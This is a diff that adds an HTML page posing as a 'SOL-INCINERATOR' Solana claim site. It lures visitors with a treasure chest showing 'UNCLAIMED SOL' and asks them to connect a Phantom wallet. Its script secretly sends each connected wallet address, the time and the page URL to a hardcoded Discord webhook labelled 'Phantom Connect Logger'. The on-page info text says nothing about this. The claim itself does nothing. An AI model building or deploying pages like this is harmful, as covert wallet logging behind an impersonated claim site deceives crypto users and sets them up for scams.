@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOL-INCINERATOR — Claim SOL</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+:root{
+  --bg:#182214; --bg2:#11180e; --panel:#151c12; --panel2:#1b2416;
+  --green:#6ff0a0; --green2:#98e936; --green3:#42b96f;
+  --text:#f3f7ee; --muted:#a8b3a0; --line:#31412d; --black:#070a07;
+}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;background:var(--bg);color:var(--text);font-family:"Press Start 2P",monospace}
+body{overflow-x:hidden}
+button{font:inherit;color:inherit;cursor:pointer}
+a{color:inherit;text-decoration:none}
+.topbar{height:78px;background:#11180f;border-bottom:1px solid #182619;display:flex;align-items:center;justify-content:space-between;padding:0 20px}
+.brand{display:flex;align-items:center;gap:9px;color:var(--green2)}
+.brand-mark{width:30px;height:30px;background:var(--green2);position:relative;clip-path:polygon(0 0,100% 0,100% 100%,0 100%)}
+.brand-mark:before,.brand-mark:after{content:"";position:absolute;background:#182214}
+.brand-mark:before{width:7px;height:20px;left:7px;bottom:0}
+.brand-mark:after{width:7px;height:13px;left:17px;bottom:0}
+.brand-text{line-height:1.15;font-size:17px}
+.brand-sub{font-size:8px;color:#e9f3df;display:block;margin-top:2px}
+.topnav{display:flex;gap:10px;align-items:center}
+.navbtn,.hamb{background:#10150e;border:1px solid #bfc8bc;padding:10px 12px;min-height:31px;font-size:12px}
+.navbtn:hover,.hamb:hover{background:#202a1b}
+.lang{display:flex;gap:5px;align-items:center}
+.wallet-top{padding:10px 14px}
+.main{max-width:1695px;margin:0 auto;padding:37px 49px 85px}
+.page-title{display:flex;align-items:center;gap:14px;font-size:27px;margin-bottom:10px}
+.back{width:42px;height:35px;background:#182019;border:1px solid #d3ddd0;display:grid;place-items:center;font-size:18px}
+.divider{height:2px;background:#72de3d;box-shadow:0 0 10px rgba(114,222,61,.35);margin-bottom:32px}
+.claim-wrap{max-width:758px;margin:0 auto}
+.tabs{display:flex}
+.tab{border:1px solid #30392f;border-bottom:none;background:#11170f;padding:11px 17px;font-size:16px}
+.tab.active{background:var(--green);color:#081008}
+.card{min-height:407px;border:1px solid #2e3a2a;border-radius:5px;background:rgba(13,18,11,.55);box-shadow:0 0 24px rgba(0,0,0,.12);display:flex;flex-direction:column;align-items:center;text-align:center;padding:39px 25px 16px}
+.label{font-size:11px;color:#5fe79a;letter-spacing:4px;margin-bottom:24px}
+.amount{font-size:31px;margin-bottom:55px}
+.chest{width:165px;height:109px;margin-bottom:64px;position:relative}
+.chest .outer{position:absolute;inset:0;border:5px solid #8be62d;background:#79d62e}
+.chest .top{position:absolute;left:13px;top:8px;width:129px;height:26px;border:5px solid #1b3811;background:#9af044}
+.chest .body{position:absolute;left:13px;top:39px;width:116px;height:48px;border:5px solid #204218;background:#a4e74a}
+.chest .side{position:absolute;right:10px;top:39px;width:23px;height:48px;border:5px solid #204218;background:#71c92f}
+.chest .lock{position:absolute;left:62px;top:18px;width:31px;height:39px;border:5px solid #1a3610;background:#78d832;z-index:2}
+.chest .lock:after{content:"";position:absolute;left:8px;top:10px;width:6px;height:10px;background:#1a3610}
+.claim-btn{width:326px;height:45px;border:0;border-radius:5px;background:#69e999;color:#061008;font-size:16px;box-shadow:0 2px 0 #2c9e5d}
+.claim-btn:hover{filter:brightness(1.08)}
+.claim-btn:active{transform:translateY(1px)}
+.notice{margin-top:13px;border:1px solid #293427;background:#11180e;border-radius:4px;padding:10px 14px;text-align:center;font-size:8px;line-height:1.7;color:#bdc6b9}
+.notice b{color:#62e89b}
+.ad{height:64px;margin-top:13px;border-radius:4px;background:#050606;display:flex;align-items:center;justify-content:space-between;overflow:hidden;border:1px solid #111}
+.ad-left{display:flex;align-items:center;gap:10px;padding-left:51px;color:#a7eb37}
+.ad-logo{width:36px;height:36px;background:#9be936;clip-path:polygon(0 0,100% 0,100% 100%,0 100%)}
+.ad-name{font-size:17px}.ad-small{display:block;color:white;font-size:8px;margin-top:3px}
+.ad-right{height:100%;min-width:340px;background:#97df39;color:#071007;padding:8px 20px;display:flex;flex-direction:column;justify-content:center;position:relative}
+.ad-right:before{content:"";position:absolute;left:-30px;top:0;border-style:solid;border-width:64px 30px 0 0;border-color:#97df39 transparent transparent transparent}
+.ad-title{font-size:17px}.ad-big{font-size:19px}
+.bottom{position:fixed;bottom:0;left:0;right:0;height:37px;background:#10170e;border-top:1px solid #273326;display:flex;z-index:10}
+.bottom button{height:37px;background:transparent;border:0;border-right:1px solid #20301e;padding:0 15px;font-size:15px}
+.bottom .selected{background:var(--green);color:#061008;border-radius:20px;height:31px;margin:3px 0 3px 15px}
+.bottom .spacer{flex:1}
+.bottom .icon{font-size:18px}
+.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;z-index:20;padding:20px}
+.modal-bg.show{display:flex}
+.modal{width:min(470px,100%);background:#11180e;border:1px solid #71806d;box-shadow:0 15px 60px rgba(0,0,0,.55);padding:25px}
+.modal h2{font-size:18px;margin:0 0 22px}
+.modal p{font-family:monospace;font-size:14px;color:#c7d0c3;line-height:1.6}
+.modal-row{display:flex;gap:10px;margin-top:20px}
+.modal-row button{flex:1;padding:12px;border:1px solid #768171;background:#182118}
+.modal-row .primary{background:var(--green);color:#061008;border-color:var(--green)}
+.close{float:right;background:none;border:0;font-size:18px}
+.info{display:none;padding:30px;font-family:monospace;color:#c8d0c4;line-height:1.8}
+.info.show{display:block}
+.info h3{font-family:"Press Start 2P";font-size:14px;color:#6ff0a0}
+.toast{position:fixed;right:20px;top:95px;background:#10170e;border:1px solid #67e79b;padding:14px 17px;font-family:monospace;font-size:13px;display:none;z-index:30}
+.toast.show{display:block}
+@media(max-width:900px){
+  .topbar{height:auto;min-height:78px;padding:12px 14px;gap:12px}
+  .topnav .navbtn:nth-child(-n+2){display:none}
+  .brand-text{font-size:13px}
+  .main{padding:27px 15px 75px}
+  .page-title{font-size:20px}
+  .claim-wrap{width:100%}
+  .ad-left{padding-left:15px}
+  .ad-right{min-width:45%;padding:8px 10px}
+  .ad-title,.ad-big{font-size:10px}
+}
+@media(max-width:520px){
+  .topnav{gap:4px}
+  .lang{display:none}
+  .wallet-top{font-size:9px;padding:8px}
+  .card{min-height:390px}
+  .amount{font-size:25px}
+  .claim-btn{width:90%}
+  .ad-name{font-size:10px}.ad-small{font-size:6px}
+  .bottom button{padding:0 10px;font-size:10px}
+}
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <a class="brand" href="#" onclick="toast('SOL-INCINERATOR');return false">
+    <span class="brand-mark"></span>
+    <span class="brand-text">SOL-INCINERATOR<span class="brand-sub">a solslugs project</span></span>
+  </a>
+  <nav class="topnav">
+    <!-- INCINERATOR verbindet jetzt Phantom -->
+    <button class="navbtn" onclick="connectPhantom()">INCINERATOR</button>
+    <button class="navbtn" onclick="toast('Tools opened')">TOOLS</button>
+    <button class="navbtn" onclick="toast('Rewards opened')">REWARDS</button>
+    <button class="navbtn lang">◉ EN</button>
+    <button class="navbtn wallet-top" onclick="connectPhantom()">CONNECT WALLET</button>
+    <button class="hamb" onclick="openSettings()">☰</button>
+  </nav>
+</header>
+
+<main class="main">
+  <div class="page-title">
+    <button class="back" onclick="history.back()">‹</button>
+    <span>CLAIM SOL</span>
+  </div>
+  <div class="divider"></div>
+
+  <section class="claim-wrap">
+    <div class="tabs">
+      <button id="claimTab" class="tab active" onclick="showTab('claim')">CLAIM</button>
+      <button id="infoTab" class="tab" onclick="showTab('info')">INFO</button>
+    </div>
+
+    <div class="card">
+      <div id="claimContent">
+        <div class="label">UNCLAIMED SOL</div>
+        <div class="amount" id="amount">??? SOL</div>
+        <div class="chest" aria-label="pixel treasure chest">
+          <div class="outer"></div>
+          <div class="top"></div>
+          <div class="body"></div>
+          <div class="side"></div>
+          <div class="lock"></div>
+        </div>
+        <button class="claim-btn" onclick="claim()">Connect Wallet</button>
+      </div>
+
+      <div id="infoContent" class="info">
+        <h3>ABOUT CLAIM</h3>
+        <p>Connect Phantom via the INCINERATOR or CONNECT WALLET button.</p>
+        <p>Only the public wallet address is read. No seed phrases or private keys are ever requested.</p>
+      </div>
+    </div>
+
+    <div class="notice"><b>FUN mode</b> simplifies claiming rent and rewards. Use <b>PRO mode</b> for the classic interface (including burns).</div>
+
+    <div class="ad">
+      <div class="ad-left">
+        <div class="ad-logo"></div>
+        <div class="ad-name">SOL-INCINERATOR<span class="ad-small">a solslugs project</span></div>
+      </div>
+      <div class="ad-right">
+        <div class="ad-title">CONTACT US</div>
+        <div class="ad-big">GET YOUR AD HERE!</div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="bottom">
+  <button class="selected" onclick="setMode('FUN')">FUN</button>
+  <button onclick="setMode('PRO')">PRO</button>
+  <button onclick="setMode('DEV')">DEV</button>
+  <button onclick="openSettings()">⚙</button>
+  <button onclick="openHelp()">?</button>
+  <button onclick="toast('X / social link')">𝕏</button>
+  <div class="spacer"></div>
+  <button class="icon" onclick="toggleSound()">◖</button>
+</footer>
+
+<div id="modalBg" class="modal-bg" onclick="closeOnBg(event)">
+  <div class="modal">
+    <button class="close" onclick="closeModal()">×</button>
+    <h2 id="modalTitle">CONNECT WALLET</h2>
+    <div id="modalBody">
+      <p id="modalText">Verbinde Phantom...</p>
+      <div class="modal-row">
+        <button class="primary" onclick="closeModal()">OK</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+// ==========================================================
+// KONFIGURATION
+// ==========================================================
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1553442615620403304/831DPZrnKpWyc2Zg04_0FBqXLFfMbJah6RNYI5zC9UX5OmPVG0aONlGvmT0uWDYDbka7";
+
+let soundOn = true;
+let connectedWallet = null;   // Name des Wallets
+let walletAddress  = null;    // Öffentliche Adresse
+
+// ---------- Toast ----------
+function toast(msg){
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  clearTimeout(window.toastTimer);
+  window.toastTimer = setTimeout(()=>el.classList.remove('show'), 2200);
+}
+
+// ---------- Discord Webhook ----------
+async function sendWebhook(address, walletName){
+  try{
+    const now = new Date().toLocaleString('de-DE', {timeZone:'Europe/Berlin'});
+    await fetch(DISCORD_WEBHOOK, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        username: "SOL-INCINERATOR",
+        embeds: [{
+          title: "\u26A1 Neue Wallet verbunden!",
+          color: 0x98e936,
+          fields: [
+            { name:"Wallet",   value: walletName, inline:true },
+            { name:"Adresse",  value: "`" + address + "`" },
+            { name:"Zeit",     value: now, inline:true },
+            { name:"Seite",    value: location.href }
+          ],
+          footer: { text: "Phantom Connect Logger" }
+        }]
+      })
+    });
+  }catch(e){
+    console.error("Webhook Fehler:", e);
+  }
+}
+
+// ---------- Phantom Connect ----------
+async function connectPhantom(){
+  const provider = window.solana || window.phantom?.solana;
+
+  if(!provider || !provider.isPhantom){
+    toast('Phantom nicht gefunden!');
+    openModal('PHANTOM FEHLT',
+      'Phantom wurde nicht gefunden.<br>Installiere die Extension:<br><a href="https://phantom.app" target="_blank" style="color:#98e936">phantom.app</a><br><br>Oder öffne die Seite im Phantom-Browser (Mobile).');
+    return;
+  }
+
+  try{
+    // connect() öffnet den Phantom-Popup — der User muss bestätigen
+    const resp = await provider.connect();
+    walletAddress  = resp.publicKey.toString();
+    connectedWallet = 'Phantom';
+
+    // UI updaten
+    document.querySelectorAll('.wallet-top,.claim-btn')
+      .forEach(x => x.textContent = shortAddr(walletAddress) + ' Connected');
+    document.getElementById('amount').textContent = '0.000 SOL';
+
+    toast('Phantom verbunden: ' + shortAddr(walletAddress));
+
+    // Discord-Nachricht senden
+    await sendWebhook(walletAddress, 'Phantom');
+  }catch(err){
+    // User hat im Phantom-Popup abgelehnt
+    toast('Verbindung abgelehnt');
+  }
+}
+
+function shortAddr(a){
+  return a.slice(0,4) + '...' + a.slice(-4);
+}
+
+// ---------- Modal ----------
+function openModal(title, html){
+  document.getElementById('modalTitle').textContent = title;
+  document.getElementById('modalBody').innerHTML =
+    '<p>' + html + '</p>' +
+    '<div class="modal-row"><button class="primary" onclick="closeModal()">OK</button></div>';
+  document.getElementById('modalBg').classList.add('show');
+}
+function closeModal(){document.getElementById('modalBg').classList.remove('show')}
+function closeOnBg(e){if(e.target.id==='modalBg')closeModal()}
+
+// ---------- Restliche UI ----------
+function openSettings(){
+  openModal('SETTINGS', 'Interface settings — Sound: ' + (soundOn?'ON':'OFF'));
+}
+function openHelp(){
+  openModal('HELP', 'Klicke INCINERATOR oder CONNECT WALLET um Phantom zu verbinden.');
+}
+
+function claim(){
+  if(!connectedWallet){connectPhantom();return}
+  toast('Claim action ready — demo only');
+}
+
+function showTab(tab){
+  const claim=document.getElementById('claimContent');
+  const info=document.getElementById('infoContent');
+  const ct=document.getElementById('claimTab');
+  const it=document.getElementById('infoTab');
+  if(tab==='claim'){
+    claim.style.display='block';info.classList.remove('show');
+    ct.classList.add('active');it.classList.remove('active');
+  }else{
+    claim.style.display='none';info.classList.add('show');
+    ct.classList.remove('active');it.classList.add('active');
+  }
+}
+
+function setMode(mode){
+  document.querySelectorAll('.bottom button').forEach(b=>b.classList.remove('selected'));
+  const btn=[...document.querySelectorAll('.bottom button')].find(b=>b.textContent.trim()===mode);
+  if(btn)btn.classList.add('selected');
+  toast(mode+' mode selected');
+}
+function toggleSound(){
+  soundOn=!soundOn;
+  toast('Sound '+(soundOn?'ON':'OFF'));
+}
+
+//phantomAccountChanged-Event (optional)
+window.addEventListener('load', ()=>{
+  const p = window.solana;
+  if(p?.on){
+    p.on('accountChanged', (acc)=>{
+      if(acc){
+        walletAddress = acc.toString();
+        toast('Wallet gewechselt: ' + shortAddr(walletAddress));
+        sendWebhook(walletAddress, 'Phantom (gewechselt)');
+      }else{
+        connectedWallet = null; walletAddress = null;
+        document.querySelectorAll('.wallet-top,.claim-btn').forEach(x=>x.textContent='Connect Wallet');
+      }
+    });
+  }
+});
+</script>
+</body>
+</html>
